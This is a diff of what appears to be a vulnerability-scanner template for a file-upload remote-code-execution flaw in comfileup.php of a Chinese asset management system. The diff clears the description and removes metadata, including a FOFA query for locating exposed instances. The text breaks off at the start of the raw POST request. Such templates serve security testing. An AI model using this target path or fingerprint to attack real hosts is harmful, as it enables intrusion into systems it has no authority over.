@@ -3,12 +3,8 @@ info:
   name: 百易云资产管理运营系统 comfileup.php 文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fb7tma0dsoh4e9bc'
+  description: ''
   tags: rce,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fb7tma0dsoh4e9bc
-    fofa: body="不要着急，点此"
 http:
 - raw:
   - 'POST /comfileup.php HTTP/1.1
